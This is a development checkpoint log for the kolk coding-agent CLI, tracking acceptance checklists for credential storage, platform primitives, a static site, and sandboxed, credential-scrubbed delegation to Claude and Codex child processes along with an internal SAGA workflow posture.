- Resolve the default `openrouter/default` credential for `kolk` and prompt invocations, with
  `OPENROUTER_API_KEY` preserving its documented precedence over the file manifest.
- Print the owner's exact three-line next action when neither source has a credential.
- Feed the resolved secret into the provider client and retain the existing computed model, mode,
  effort, and session defaults.
- Prove a stored key can complete one model turn against an offline OpenAI-compatible fixture.

Non-goals:

- No `KOLK_API_KEY`, provider picker, profiles, keychain, helper, DPAPI, `doctor`, source trace, or
  shadowing warning; those belong to the full item-5 credential-chain migration.
- No keyless local-provider resolution or subscription backend.
- No live provider request, installer, archive, checksum, signing, or clean-machine claim.
- No modes/config architecture migration beyond preserving the defaults already in production.

Acceptance checklist:

- [x] bare `kolk` with no environment or stored key exits 2 and prints exactly:
  `kolk needs an API key before it can use models.`, `Add one:  kolk key <API_KEY>`, and
  `Then run: kolk`—with no stack trace, generic error prefix, help suffix, or config instruction.
- [x] a missing key creates no config, data, cache, session, checkpoint, or credential file.
- [x] `openrouter/default` from the file store reaches the provider client without appearing in
  stdout, stderr, a session, or an error.
- [x] a non-empty `OPENROUTER_API_KEY` wins and completes resolution without reading even a corrupt
  credential manifest.
- [x] corrupt, unavailable, cancelled, or otherwise failed credential reads remain hard errors and
  never masquerade as the first-run screen.
- [x] zero-value runtime options compute `openrouter/auto`, `code`, and `standard`; existing flag,
  session, and config model precedence does not change.
- [x] an offline SSE fixture observes the stored bearer credential and computed default model, and
  the single-shot command exits 0 with the fixture response.
- [x] focused tests pass independently, then the full repository/platform gates pass.
- [x] build log records red, green, refactor, exact verification commands, and measured budgets.

## Active group — architecture migration step 5: L0 platform boundary

The group closes only when every package is independently green and no behavior outside its stated
scope changes.

- [x] **L0.1 paths** — XDG-aware directory ownership and one-time prototype migration.
- [x] **L0.2 shell** — one process-execution owner with process-group teardown.
- [x] **L0.3 atomicfile** — durable replace with mode preservation.
- [x] **L0.4 secret primitive** — non-printable secret handle, file store, and auth transport.
- [x] **L0.5 terminal facts** — correctly detect TTYs, color preference, and safe output width.
- [x] **L0.6 sortable identifiers** — monotonic typed ULIDs for sessions, turns, events, calls, and
  tasks. Existing uncommitted code is input to this checkpoint, not yet an accepted result.
- [x] **L0.7 file lock** — Unix advisory lock plus an honest Windows implementation/stub, with
  contention, release, cancellation, and stale-metadata tests.
- [x] **L0.8 step-5 closure** — run every repository gate, update the architecture status and build
  log, and verify all L0 packages cross-compile for the supported target matrix.

### L0.5 terminal facts — active detail

Scope:

- `IsTerminal` must return true only for an actual terminal, not for every character device.
- Color precedence must be deterministic for `NO_COLOR`, `KOLK_NO_COLOR`, `FORCE_COLOR`,
  `CLICOLOR_FORCE`, `TERM=dumb`, and redirected output.
- Width must accept sensible `COLUMNS` values and fall back to 80 otherwise.

Non-goals:

- No ANSI rendering or TUI behavior.
- No live resize events.
- No changes to CLI output.
- No work on modes, config, protocol, or file locking.

Acceptance checklist:

- [x] regular files, pipes, and nil handles are rejected.
- [x] non-TTY character devices such as `/dev/null` are rejected.
- [x] actual TTY detection is delegated to a platform implementation rather than inferred from file
  mode.
- [x] color-precedence table is covered by unit tests.
- [x] width validation is covered by unit tests.
- [x] Darwin and Linux implementations compile; Windows behavior is explicit and tested or marked
  as the architecture step-13 stub.
- [x] focused tests pass.
- [x] full repository gates pass.
- [x] build log records the result.

### L0.6 sortable identifiers — active detail

Scope:

- Generate canonical Crockford-base32 ULIDs with a known kind prefix.
- Keep IDs strictly increasing within one process, including same-millisecond bursts and backward
  wall-clock movement.
- Recover the millisecond timestamp and kind without opening persisted data.
- Preserve uniqueness under concurrent generation.

Non-goals:

- No distributed ordering guarantee across processes or machines.
- No database integration or migration of existing session names.
- No event sequence numbers; the event bus owns those separately.
- No changes to session, engine, or protocol packages.

Acceptance checklist:

- [x] `New` emits only one of the five registered kind prefixes.
- [x] parsing rejects bare ULIDs, unknown prefixes, malformed length, forbidden characters, and
  overflowing 130-bit encodings.
- [x] an official ULID vector proves the body is interoperable rather than merely self-consistent.
- [x] same-millisecond IDs are strictly increasing.
- [x] backward clock movement cannot move IDs backward.
- [x] concurrent generation is race-free and unique.
- [x] timestamps round-trip at millisecond precision.
- [x] focused tests and race detector pass.
- [x] full repository gates pass.
- [x] build log records the red/green/refactor result.

### L0.8 step-5 closure — active detail

Scope:

- Make cross-compilation a repeatable repository gate rather than a one-time command transcript.
- Compile the complete root module for macOS and Linux on both release architectures.
- Keep Windows compilation advisory but continuously checked until step 13 makes runtime behavior
  and CI support mandatory.
- Reconcile architecture documentation and the measured build record with the actual tree.

Non-goals:

- No credential, onboarding, provider, engine, or UI behavior.
- No Windows runtime claim; explicit stubs remain explicit.
- No release archive or installer yet; owner-trial checkpoint T0.4 owns delivery.

Acceptance checklist:

- [x] one named command cross-compiles the complete root module for Darwin amd64/arm64, Linux
  amd64/arm64, and Windows amd64 with `CGO_ENABLED=0`.
- [x] the named command runs in CI and from the Makefile.
- [x] the ordinary host tests still execute normally; cross-compiled test binaries are compiled but
  never mistaken for executed tests.
- [x] architecture migration step 5 is marked complete with its real package/test/budget results.
- [x] formatting, vet, tests, architecture, purity, build-tag, platform, and budget gates pass.
- [x] build log records the closure and the next owner-trial checkpoint.

### T0.1 credential store — active detail

Scope:

- Move credential persistence out of `internal/secret` into `internal/keystore`.
- Implement the version-1 routing manifest at `paths.Dirs.CredentialsFile()` with the file backend.
- Store multiple normalized `provider/profile` slots without lost updates across processes.
- Expose only metadata from list/probe operations; plaintext leaves as `secret.Secret` only from an
  explicit value read.

Non-goals:

- No CLI command or first-run output; T0.2 and T0.3 own those.
- No key-shape inference or provider network verification.
- No keychain, DPAPI, helper backend, OAuth, or legacy-config migration.
- No encryption claim: the default is owner-readable plaintext encoded for transport safety.

Acceptance checklist:

- [x] manifest schema is versioned and keyed by normalized `provider/default` references.
- [x] file values use one tagged base64 encoding and round-trip arbitrary bytes safely.
- [x] file and directory land at `0600` and `0700`; symlinks and non-regular files are refused.
- [x] every read-modify-write holds `internal/lock` under the caller's context and commits through
  `internal/atomicfile`.
- [x] concurrent independent stores preserve every credential with no torn JSON or lost entry.
- [x] metadata listing cannot contain a plaintext field and is stably sorted.
- [x] empty refs/values, oversized values, unknown manifest versions/backends, and corrupt JSON
  return typed errors without quoting credential contents.
- [x] delete is idempotent and never damages another slot.
- [x] the old OS-touching `secret.FileStore` is removed; `internal/secret` no longer reads or writes
  files.
- [x] focused tests and race detector pass.
- [x] full repository and platform gates pass.
- [x] build log records the red/green/refactor result.

### T0.2 key command — active detail

Scope:

- Make the owner's positional `kolk key <API_KEY>` command infer a supported provider, verify an
  OpenRouter key through exactly one bounded request, and store it in the T0.1 manifest.
- Deny credential shapes Kolkrabbi must never hold before any provider inference or network call.
- Render only a safe provider name, mask, verification result, and credential path; a verification
  outage warns but does not discard the user's paste.
- Evacuate a prototype `config.json.api_key` safely and make `kolk config set-key` point to the one
  supported key command.

Non-goals:

- No bare status page, implicit piped input, TTY prompt, ambiguity picker, `--why`, `--manage`,
  backend moves, `logout`, OAuth, keychain, or profiles. Explicit `-` stdin and
  `<provider> <key|->` are included because the CI and ambiguity errors must not recommend commands
  that do not work.
- No verification against multiple candidate providers. Only the already inferred OpenRouter host
  may receive a key, and every test uses an offline scripted HTTP server.
- No first-run session resolution or output; T0.3 owns reading the manifest and launching a model.

Delivery slices (only one active at a time):

- [x] **T0.2a shape classifier and mask** — embedded data table, deny precedence, longest-prefix
  inference, safe masking invariants.
- [x] **T0.2b OpenRouter verifier** — `GET /api/v1/key`, two-second caller budget, typed result and
  scrubbed failures, no real-network tests.
- [x] **T0.2c CLI happy path** — positional command, CI refusal, safe output, verification warning,
  manifest write, and write-failure recovery.
- [x] **T0.2d legacy evacuation** — idempotent `api_key` migration, secret-free config schema, and
  the old command's hard redirect.

Acceptance checklist:

- [x] every infer row and every deny row from plan item 5 is table-driven and tested; deny always
  wins and the longest valid prefix wins.
- [x] masks reveal a useful type prefix and last four only when at least eight characters remain
  hidden; prefix/tail slices never overlap.
- [x] OpenRouter verification sends one authenticated `GET /api/v1/key` to the configured verifier
  host, has a hard two-second budget, and parses the current documented response.
- [x] verification failure is a redacted warning and exit 0 after a successful store; a store
  failure is exit 1 with a re-paste recovery that never prints the key.
- [x] positional key input is refused in CI with the stdin form named as the safe alternative.
- [x] denied and unrecognized shapes store nothing and contact no host; non-interactive ambiguity
  names the explicit-provider escape and exits 2.
- [x] success writes `openrouter/default` at `paths.Dirs.CredentialsFile()` and output contains the
  provider, safe mask, status, and path but never the full key.
- [x] a legacy config key migrates once without overwrite or loss; every newly written config is
  credential-free and `config set-key` names `kolk key`.
- [x] focused tests and race detector pass after each delivery slice.
- [x] full repository and platform gates pass after each delivery slice.
- [x] build log records each red/green/refactor result and the completed T0.2 command.

### W0.1 landing site — active detail

Scope:

- Add a framework-free static site under `site/` for `kolkrabbi.francomichetti.com`.
- Use an original purple pixel-octopus logo and a sparse black terminal composition inspired by
  Omarchy's visual restraint without copying its logo or assets.
- Explain the install → `kolk` → API-key flow exactly, while clearly marking the installer as
  unavailable until the first release is published.
- Ship the Cloudflare Pages `_headers` policy and a deterministic local site contract test.

Non-goals:

- No Cloudflare account, DNS, Pages project, or production deployment mutation from this checkout.
- No live `install.sh`, release archive, checksum, signing, or update feed; T0.4 owns those.
- No framework, package manager, build step, analytics, cookies, form, database, or client-side
  JavaScript.

Acceptance checklist:

- [x] `site/index.html` is semantic, responsive, keyboard-visible, and usable without external
  fonts, scripts, images, or network requests.
- [x] the original SVG reads as a retro octopus at large and favicon sizes and uses the purple
  palette rather than an Omarchy asset.
- [x] the page contains the exact public install URL, `kolk`, `kolk key <API_KEY>`, and an honest
  pre-release availability label.
- [x] GitHub and license links are correct; claims match capabilities already implemented or
  explicitly marked as upcoming.
- [x] `_headers` supplies CSP, clickjacking, MIME-sniffing, referrer, permissions, and conservative
  `/install.sh` caching rules supported by Cloudflare Pages.
- [x] a zero-dependency `scripts/test-site.sh` fails independently for missing content, unsafe
  external dependencies, or a drifted onboarding command.
- [x] local site test, shell syntax check, and the existing repository gates pass.
- [x] build log records the design, verification, exact Pages build settings, and owner-only
  Cloudflare dashboard steps.

### W0.2 capabilities catalog — active detail

Scope:

- Add a prominent `Capabilities` navbar button and a dedicated static catalog page that covers the
  complete working surface and roadmap in plain language.
- Mark every capability as `Available now`, `Designed`, or `Planned`; the page must explain that
  designed and planned items are not shipped yet.
- Cover Claude Agent and Codex subscription sign-in, preserving one Kolkrabbi session while
  switching backends, provider-agnostic API-key onboarding, cap-aware continuation through the
  best-rated eligible configured models, ask-before-free fallback by default, opt-in automatic
  switching, themes, and the remaining product capability groups.
- End the page with two accessible explainer-video slots, one English and one Spanish, that remain
  honest placeholders until their real media sources are supplied.

Non-goals:

- No implementation of subscription adapters, cross-backend routing, cap detection, automatic
  failover, themes, TUI, dashboard, daemon, desktop, or mobile clients in this website checkpoint.
- No invented config keys, release dates, model rankings, live video URLs, embedded third-party
  players, analytics, cookies, forms, JavaScript, or external site dependencies.
- No Pages/DNS mutation, installer publication, release tag, repository-visibility change, or
  clean-machine rehearsal.

Acceptance checklist:

- [x] the landing-page navbar has a visually distinct `Capabilities` link to the dedicated page,
  and the catalog identifies that link as the current page.
- [x] the catalog has a status legend and visibly labels working behavior separately from designed
  and planned behavior; no roadmap item is presented as usable today.
- [x] the catalog covers current modes, effort, providers, key onboarding, tools, sessions,
  checkpoints, local stats, and project memory.
- [x] the catalog covers Claude Agent and Codex subscription sign-in plus same-session backend
  continuity without shipping the prohibited `claude-code` product/feature name.
- [x] the planned limit policy preserves work, explains the next backend, selects the best-rated
  eligible configured model, asks before a free fallback by default, and names automatic switching
  as an opt-in alternative.
- [x] themes and the remaining workflow, safety, extensibility, dashboard, protocol, desktop, and
  mobile roadmap groups are represented with honest status labels.
- [x] English and Spanish explainer slots are the final main-content section, labelled by language
  and marked coming soon without broken media or external embeds.
- [x] both pages remain semantic, responsive, keyboard-visible, JavaScript-free, and free of
  external runtime assets under the existing strict CSP.
- [x] the independent site contract records red then green, full repository gates pass, and the
  build log records exact evidence.

### L0.7 file lock — active detail

Scope:

- Serialize read-modify-write operations across independent `kolk` processes.
- Offer immediate and context-bounded acquisition.
- Record the holder PID for a useful “another kolk is running” error.
- Let the OS release a lock after normal close or process death.

Non-goals:

- No in-memory mutex registry; it would not protect separate processes.
- No deletion of lock files on release; unlinking a locked inode permits two simultaneous owners.
- No credential-manifest wiring yet; the keystore checkpoint consumes this primitive.
- No distributed or network filesystem locking guarantee.

Acceptance checklist:

- [x] the first contender acquires an exclusive OS lock and writes its PID under mode `0600`.
- [x] an immediate second contender gets `ErrBusy` and the holder PID.
- [x] context-bounded acquisition waits, succeeds after release, and returns the context error on
  timeout or cancellation.
- [x] `Close` releases exactly once and is safe to call repeatedly.
- [x] stale PID text never blocks acquisition and is replaced by the new owner.
- [x] failure paths close file descriptors and never remove another process's lock file.
- [x] Darwin and Linux use `flock`; Windows compiles with an explicit step-13 support boundary.
- [x] focused tests and race detector pass.
- [x] full repository gates pass.
- [x] build log records the red/green/refactor result.

## Phase queue — one `/loop` per phase

[`PLAN.md`](PLAN.md) owns the phase plan, its ordering rationale and the exact `/loop` command for
each phase. This is the checkpoint-side index of the same order, so a builder can see which leaves a
phase must close without leaving this file.

| Phase | Items | Leaves | State |
|---|---|---|---|
| A finish the subscription path | 4, 24 | P11.7 ✓, B12.12 ✓, B12.14 ✓ | B12.13 needs the owner; failure-path tests open |
| B managed local models | 25 | L13.4 ✓, L13.5a–c ✓, L13.5b3 ✓ | L13.5b4 needs the owner |
| C sessions, context, memory | 12 | doc ✓, C12.1–C12.7 ✓ (9 leaves) | complete |
| D the local dashboard | 17 | doc ✓, D17.1–D17.3 ✓; A12.2–A12.4 superseded | complete |
| E tools, permissions, sandboxing | 13 | doc ✓, E13.1–E13.7 ✓ | in-process floor complete; OS sandbox accepted v1 and pending V34.1e |
| F orchestration & per-task routing | 14 | doc ✓, F14.1–F14.6 ✓ | complete |
| G the surface | 11, 15, 16 | docs ✓, G11.1–G11.6 ✓, G15.1–G15.3 ✓, G16.5 ✓ | G16.1–G16.4 queued (commands, hooks, mcp rules) |
| I reach | 26–29 | docs ✓, I26.1–I26.7 ✓, I27.1–I27.6 ✓, I28.1–I28.3 ✓, I29.1 ✓ | complete |
| H ship it for real | T0.5, 19–23 | all five docs ✓, L19.1–L19.2 ✓, L20.1–L20.2 ✓, L21.0–L21.4 ✓, L22.1–L22.2 ✓, L23.1–L23.2 ✓ | owner confirms T0.5 complete; V34.5b owns transcript linkage |
| J borrowed hardening | 30, 31, 32 | all three docs ✓, L30.1–L30.4 ✓, L31.1 ✓, L32.1–L32.5 ✓ | complete |

**Every item in PLAN.md is hardened as of 2026-08-27.** Items 1, 24 and 25 stay `[~]` by design — each tracks something the world keeps changing — and everything from 2 to 32 has a document, a tick, and a ratchet that fails the build if those two ever disagree. What is left is build work, not decisions.

This table was four phases out of date until an audit on 2026-08-27 rewrote it: it still called E
"building — blocks F", F and G "queued", and did not mention phase I at all, while E, F, G's built
half, D and I26.1–I27.2 had all closed. It is the first thing anyone reads about where the project
is, and it was the least accurate — the same "nothing walks back" failure the audit found in a leaf
(U0.1), a plan row (item 24) and a checkpoint group (A12), now found in the summary itself.

The ordering rule is recorded in PLAN.md: finish what is half-built before starting what is unbuilt,
put correctness before the surface that displays it, and put permissions before autonomy. Phase D
sits after the accounting fix deliberately — a dashboard built on the pre-B12.11 numbers would have
been confidently wrong.

## Vision completion program — V34

The historical phase queue above is a record of feature delivery. It is not the current proof that
the product is safe, recoverable, and ready to claim completion. [`docs/plan/34-vision-completion.md`](docs/plan/34-vision-completion.md)
is the authoritative forward hierarchy; these rows are its execution index. Do not claim a V34 leaf
until V34.0 has reconciled the exact baseline and the owner has accepted the bounded v1 scope.

| Phase | Sub-checkpoints | Phase exit |
|---|---|---|
| V34.0 baseline | V34.0a evidence; V34.0b ledger; V34.0c scope freeze | reproducible definition of shipped vs deferred scope |
| V34.1 security | V34.1a endpoint credential; b child env; c checkpoint safety; d output/argv/userinfo; e full-auto floor; f delegated capability envelope | exploit regression and independent bypass review |
| V34.2 integrity | V34.2a process close; b session snapshots; c task rewind; d event replay; e cancellation join; f cost reservation | race/cancellation/replay proof and terminal-outcome audit |
| V34.3 saga | V34.3a lock/stop; b durable state; c clean rollback; d full accounting; e fault injection; f entrypoint/directive/scheduler hook | isolated stop/resume/rollback failure matrix |
| V34.4 product truth | V34.4a subscription tier; b Codex catalog; c provider matrix; d local claims | every selector row has supported capability evidence |
| V34.5 release proof | V34.5a platforms; b clean machine; c reproducible release; d surface docs; e independent audit | stable release candidate and fresh-install transcript |
| V34.6 closure | V34.6a owner trial; b closure audit; c release decision | honest v1/beta statement with no hidden P0/P1 |

### V34 leaf acceptance and review record

Before a leaf is `[x]`, record its scope/non-goals/invariant, red reproduction, focused green test,
adversarial failure-path test, independent reviewer plus rerun command, repository-gate result, and
documentation walk-back. Concurrency leaves require `-race` and bounded cancellation; security
leaves require a concrete bypass attempt; persistence/saga leaves require fault injection or restart
evidence; release leaves require a clean-environment transcript. The builder and independent reviewer
must be different people or agents.

V34.1f Leaf A is complete; V34.3f Leaf B remains queued. The existing historical “Active group”
convention remains in force: claim one leaf, name its owner, and do not begin another implementation
leaf until its evidence is recorded.

### V34.0a release baseline — complete 2026-09-01

**Scope:** capture a reproducible, pre-change release baseline; no production behaviour changes.

**Invariant:** a future reviewer can distinguish what the current release supports from what only
cross-compiles, is catalog metadata, is environment-blocked, or remains unverified.

**Evidence:** `5074e6206780` (`release: v1.2.32`) was clean before this documentation record.
The host is Go 1.27.0/Linux amd64 (module minimum Go 1.25.0); runtime support is macOS/Linux on
amd64 and arm64, while Windows amd64 is advisory cross-build only. OpenRouter-compatible endpoints
and host Ollama are available; runnable subscription adapters are Claude Pro/Max and ChatGPT
Plus/Pro, including Codex `gpt-5.6-sol`, `gpt-5.6-terra`, and `gpt-5.6-luna`. Gemini rows remain
explicitly unsupported subscriptions.

**Verification:** `make fmt-check vet plan-check`, `make platforms`, and `git diff --check` passed;
the plan ratchet reported 101 checks. `make test` reached 1,874 tests but exited 2 when `httptest`
was denied IPv6 loopback (`listen tcp6 [::1]:0: socket: operation not permitted`), not from a test
assertion. `TMPDIR=/var/tmp make check` cannot start because `/var/tmp` is read-only here.
`goreleaser` and `cosign` are unavailable, so a release rehearsal remains pending.

**Independent review:** the `v340a_baseline` agent collected the source/toolchain/gate evidence;
Codex independently checked the supported-platform/provider declarations and recorded the exact
environment limits. No production files changed.

### V34.1f + V34.3f — SAGA and delegated execution hardening checkpoint — Leaf A complete; Leaf B queued 2026-09-01

**Reason for opening:** a real agent run from `/home/onembyte` reported that it was outside the
repository, and provider children currently inherit only the process directory and vendor defaults.
The result is either a SAGA command that cannot locate the project or a child that cannot inspect the
intended checkout or research through the network. These are two boundaries with different failure
and authorization rules; they must not be fixed as one prompt tweak.

**Owners and order:** V34.1f is first because it defines what a child may see and reach. V34.3f is
second because SAGA must invoke that capability envelope and persist one next unit of work. Only one
leaf may be active at a time; the second leaf cannot begin until the first leaf's focused and
independent review evidence is recorded.

#### Leaf A — V34.1f delegated execution capability envelope

Scope:

- Resolve one verified project root before a child starts. Pass it explicitly to provider CLIs using
  their supported working-directory/additional-directory controls; never rely on the parent's current
  directory or on a guessed home-directory scan.
- Declare capabilities in one internal value: primary workspace, additional read/write roots (normally
  none), network enabled for user-requested research and repository operations, and provider name.
- Codex uses `--cd <root>` plus the narrow `-c sandbox_workspace_write.network_access=true` override
  when network is allowed; Claude uses its working directory and `--add-dir` only when an additional
  root is explicitly present. Neither path uses `danger-full-access` as a convenience fallback.
- Keep credential minimization separate from network availability: provider-owned authentication may
  work, but Kolkrabbi's OpenRouter/API credentials and unrelated environment secrets must not be
  inherited by provider children.
- Make capability state observable in task status and failure result: `workspace=<root>`,
  `network=enabled|disabled`, and `reason=<bounded text>`; a failed probe is a failed child, never a
  successful-looking task that ran blind.

Non-goals:

- No unrestricted host sandbox, no broad `--add-dir /home`, no automatic credential discovery, and
  no silent network access for chat mode or unrequested background work.
- No implicit `git pull`, push, checkout, or remote mutation. Repository reads and research may use
  the network; mutating source-control operations remain governed by the existing permission floor.
- No provider-specific prompt prose used as a substitute for process capabilities.

Invariant:

> A delegated child can read and modify only the verified project workspace, can reach the network
> only when the parent run declares it, and cannot receive Kolkrabbi's ambient secrets; if any part
> cannot be proven, the child stops with an explicit bounded diagnosis.

Required red/green/adversarial evidence:

- Red: a fake provider starter proves the current child argv/cwd has no explicit project root, and a
  sentinel environment test proves why inheriting the parent's environment is unsafe.
- Green: focused argv/cwd/env tests prove Codex and Claude receive the exact capability envelope,
  including network-on and network-off cases; unsupported provider versions fail closed with a useful
  reason.
- Adversarial: nested checkout, sibling checkout, symlinked root, missing root, hostile environment
  variable, network-disabled request, and provider-start failure. Run the focused suite under `-race`
  and prove cancellation joins the provider child.
- Independent review: a different agent repeats the sentinel and path-boundary attempts and reruns
  the focused gate before this leaf is marked complete.

#### Leaf A acceptance — V34.1f complete 2026-09-01

Implementation:

- `internal/cli` resolves and verifies one canonical project root before constructing the agent;
  the engine copies the capability envelope for each child, and the CLI adapter maps it to the
  selected Claude or Codex backend.
- `internal/shell` now accepts only an absolute, existing directory for provider cwd and always
  launches provider children with the credential-scrubbed inherited environment.
- Codex receives `--cd <canonical-root>`, explicit `--add-dir` values, and the provider-native
  `sandbox_workspace_write.network_access=true` override only when network is declared. Claude
  receives the canonical cwd and explicit `--add-dir` values; its delegated envelope fails closed
  when network is disabled because this CLI path has web and shell tools but no equivalent narrow
  network-off switch.
- Capability state is visible in provider startup status as `workspace=<root> network=enabled|disabled`;
  missing workspace and provider-start failures remain task failures and may only use the existing
  explicit ceiling fallback.

Red/green and adversarial evidence:

- Red was reproduced with missing option-aware shell/provider APIs and credential sentinel cases;
  the focused tests failed before the implementation and passed after the handoff was wired.
- Green: `TMPDIR=/tmp go test ./internal/shell ./internal/provider/agentcli ./internal/engine ./internal/cli -count=1`
  passed; `TMPDIR=/tmp go test -race ./internal/shell ./internal/provider/agentcli ./internal/engine ./internal/cli -count=1`
  passed.
- Adversarial coverage passed for relative/missing/file workspaces, nested and sibling checkouts,
  symlink canonicalization, duplicate additional roots, hostile API/token environment variables,
  network-disabled Codex omission, Claude fail-closed behavior, provider start failure, and bounded
  process cancellation. No provider path uses `danger-full-access`.
- A compatibility defect found by the repository gate was fixed: legacy exported invocation builders
  were made reachable through the empty-envelope runtime path, and `internal/arch` then passed.

Independent review and final gate:

- An independent read-only Codex 0.149.1 review was run with a three-command scope over the changed
  execution-boundary files. It reported `CLEAN` after checking workspace/symlink escape, network flags,
  environment leakage, capability propagation, and compatibility. The reviewer did not edit files.
- `TMPDIR=/tmp make check` passed: 3,051 tests; architecture, purity, build tags, Darwin/Linux/
  Windows platform matrices, lint, budgets, site, v0.1 surface, installer, protocol/spec, release,
  release workflow, verifier, smoke workflow, plan, and workflow-pin gates all passed.
- Documentation walk-back is complete in this file, `docs/plan/34-vision-completion.md`,
  `docs/build-log.md`, and `AGENTS.md`. No commit, push, tag, or release was created in this leaf.

#### Leaf B — V34.3f SAGA entrypoint and hidden progression directive

**Active subcheckpoint:** B2.2 — inline-only SAGA surface — C1, C2.1, C2.2a plain REPL routing,
and C2.2b TUI routing are complete. C3.1 — durable executing-before-work state — and C3.2a —
durable terminal-state normalization — C3.2b1 — cancellation-error preservation — and C3.2b2 —
TUI interrupted/ready lifecycle — are complete. C3.2 is closed; C4.1 — consolidated repository
gate baseline — is complete and C4.2 — independent ledger/release-line review — is next. C5 — TUI
progress-log observability — remains queued. B1 — typed internal SAGA posture marker — and B2.1 —
one bounded wake — are complete.

#### B1 scope and acceptance

- Add a typed internal posture distinct from `chat`, `code`, and `agent`; it must not become a model
  selector value or alter provider routing.
- Attach one short SAGA directive to the engine system construction only when that posture is active.
  The directive must not be appended to user messages, chapter prompts, or durable conversation turns.
- Set the posture only for SAGA's agent construction path. Ordinary `kolk`, `/plan`, agent mode, and
  provider-backed sessions must retain their existing system prompt byte-for-byte.
- Test the positive marker, absence in the default posture, and absence from the user/chapter prompt;
  run the focused engine/CLI tests and `-race` before moving to B2.

#### B1 acceptance — complete 2026-09-01

`engine.Posture` now distinguishes internal workflow purpose from the public `chat`/`code`/`agent`
mode. `PostureSaga` is attached only by `runSagaLoop` when it constructs the saga agent; ordinary
agent construction carries the default posture. The engine adds one fixed SAGA directive to system
prompt construction only. It does not rewrite the user request, chapter prompt, or durable user
conversation, and the ordinary default system prompt remains unchanged byte-for-byte.

Evidence:

- `TMPDIR=/tmp go test ./internal/engine ./internal/cli -run 'TestSagaPosture|TestDefaultPosture|Saga' -count=1`
  passed.
- `TMPDIR=/tmp go test -race ./internal/engine ./internal/cli -run 'TestSagaPosture|TestDefaultPosture|Saga' -count=1`
  passed.
- A mutation replacing the `PostureSaga` branch with `if false` failed exactly at
  `TestSagaPostureIsAnInternalSystemDirective`; the implementation was restored and the focused race
  suite passed again.
- Independent read-only review of the B1 files reported `CLEAN`; it checked separation from Mode,
  SAGA-only construction, prompt isolation, and compatibility without editing or testing.
- `git diff --check` passed. No external scheduler, provider call, commit, push, tag, or release was
  performed. B2 is the next step: make the short goal front door start exactly one bounded wake.

#### B2.1 scope and acceptance

- Add an explicit engine wake API that plans at most one chapter and executes at most one chapter per
  invocation; it must not fall through to the older continuous loop.
- Persist the selected active chapter and every terminal chapter outcome. A successful wake must stop
  with a resumable next-wake message; a failed wake must preserve a non-zero error and show the resume
  command rather than leaving a bare provider failure.
- Treat artifact-write failure as a wake failure without rewriting completed work as a chapter failure.
  Treat worker and verification cancellation as resumable `executing` state without incrementing
  strikes, rollback, or repair work after cancellation.
- Cover success, planning, failure, budget, persistence, active-chapter, and cancellation paths with
  bounded focused tests, a race run, a targeted mutation per guard, and an independent read-only
  review.

#### B2.1 acceptance — complete 2026-09-01

`SagaRunner.RunWake` now performs no more than one planning call and one chapter per invocation, then
returns `StopWake` with an inline `/saga` continuation instruction. It records the selected chapter
number in `ActiveChapter`, persists successful and failed outcomes, and reports the `/saga` marker on
a failed wake while retaining the underlying error. Artifact-write errors are propagated as fatal
wake errors without changing the actual chapter outcome. Worker and verification cancellation
preserve a resumable `executing` chapter, do not add strikes, and do not begin rollback or repair
after the cancellation boundary.

Evidence:

- `TMPDIR=/tmp go test ./internal/engine ./internal/cli -count=1` passed.
- `TMPDIR=/tmp go test -race ./internal/engine ./internal/cli -count=1` passed.
- `TMPDIR=/tmp make check` passed with **3,063 tests**; architecture, purity, build-tag, platform,
  budget, site, v0.1 surface, installer, protocol/spec, release, release-workflow, release-verifier,
  smoke-workflow, plan, and workflow-pin gates all passed. The gate also caught and closed the unused
  exported zero-value `PostureDefault`; the default remains the type's zero value and `PostureSaga`
  remains the only named production posture.
- Focused wake, CLI message, persistence, active-chapter, worker-cancellation, and
  verification-cancellation tests pass; the full engine/CLI suites were rerun in both normal and
  race modes. `git diff --check` passed.
- Mutations replacing the wake return with the continuous runner, disabling active-chapter
  recording, discarding persistence errors, disabling worker cancellation handling, and disabling
  verification cancellation handling were each caught by their targeted regression and restored.
- The independent read-only review found and the implementation corrected three real defects:
  swallowed artifact-write errors, false strikes on worker cancellation, and false strikes/rollback
  behavior on verification cancellation. Its only remaining note is B2.2's intentionally queued
  direct-goal front door, outside this subcheckpoint.
- No commit, push, tag, release, scheduler installation, or provider turn was performed. B2.2-C1 is
  next: make the inline-only `/saga` surface activate the bounded wake inside the current session.

#### B2.2-C1 scope and acceptance

- Make `/saga` a marker that may appear at the beginning, middle, or end of an ordinary prompt;
  remove the standalone `kolk saga` command and the `run`, `resume`, `status`, and `stop` lifecycle
  commands from the public surface.
- Recognize only a whitespace-delimited marker so URL/path text such as `/saga-mode` or
  `example.test/saga` cannot switch workflow posture accidentally. Preserve the user's remaining
  goal text without adding a repeated SAGA paragraph to the conversation.
- Update help, README, site copy, command-surface plans, and tests so no dead standalone command or
  old lifecycle instruction remains. A bare `/saga` explains the inline form and does not exit.

#### B2.2-C1 acceptance — complete 2026-09-01

The public SAGA surface is now inline-only. `/saga` is documented as a marker for a normal request;
the standalone `kolk saga` command and its `run`, `resume`, `status`, and `stop` subcommands were
removed. The internal artifact and bounded-wake helpers remain available for the next wiring step,
but no separate SAGA product entrypoint remains in command dispatch or help.

Evidence:

- `inlineSagaPrompt` tests cover beginning, middle, end, repeated and empty markers, URL-like text,
  word-like text, and absent markers. A mutation replacing the marker search was caught by the
  focused parser test and restored.
- Surface tests prove `lookupCommand("saga")` is absent, `/saga` is catalogued as an inline marker,
  bare `/saga` gives inline usage guidance, and wake messages no longer mention `run`, `resume`, or
  `kolk saga`.
- The stale standalone-command tests were removed or rewritten; artifact-root confinement tests
  remain. README, site, command-surface, roadmap, SAGA plan, and architecture prose were walked back
  to the inline-only contract.
- `TMPDIR=/tmp go test ./internal/cli -count=1` and `git diff --check` passed. No provider turn,
  commit, push, tag, release, or external scheduler action was performed.
- C2 is next: route an inline-marked prompt through the SAGA posture and one bounded wake in both
  the plain REPL and TUI.

#### B2.2-C2.1 — session-preserving posture seam — complete 2026-09-01

Scope:

- Allow the current `engine.Agent` to enter the internal `PostureSaga` value for one inline wake and
  return to the ordinary empty posture afterward; do not create a second session or expose posture
  as a model/mode choice.
- Rebuild the current session's system message on each transition, keep exactly one fixed SAGA
  directive, persist the change through the session seam, and reject unknown posture values without
  changing the current state.

Evidence:

- Added `Agent.SetPosture`, restricted to the empty posture and `PostureSaga`, with a shared system
  message refresh and session save.
- `TestPostureCanEnterAndLeaveSAGAOnTheCurrentSession` proves the same session receives one SAGA
  directive and returns byte-for-byte to its ordinary system prompt; it also proves unknown values
  are rejected without mutation.
